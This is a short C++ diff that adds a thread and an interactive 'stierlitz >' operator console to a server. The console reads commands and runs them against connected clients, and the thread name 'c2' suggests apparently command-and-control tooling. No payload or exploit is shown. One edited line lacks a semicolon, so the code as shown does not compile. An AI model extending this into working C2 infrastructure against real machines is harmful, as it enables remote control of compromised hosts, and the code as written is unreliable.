@@ -92,9 +92,11 @@ void Server::start() {
 
     std::thread accept_thread(&Server::accept_client, this);
     std::thread logger_thread(&Server::log_event, this);
+    std::thread c2_thread(&Server::handle_command, this);
 
     logger_thread.join();
     accept_thread.join();
+    c2_thread.join();
 }
 
 int Server::accept_client() {
@@ -298,7 +300,20 @@ void Server::log_event() {
 }
 
 void Server::handle_command() {
+    std::string command;
+    EventLog event_log(&log_mutex_, &log_cv_, &log_queue_, &user_verbosity_);
+    CommandHandler command_handler(&clients_, &event_log);
 
+    while (!shutdown_flag_) {
+        event_log << LOG_MUST << "stierlitz > "
+        std::getline(std::cin, command);
+        if (command == "exit") {
+            shutdown();
+            break;
+        } else {
+            command_handler.execute_command(command);
+        } 
+    }
 }
 
 void Server::shutdown() { 
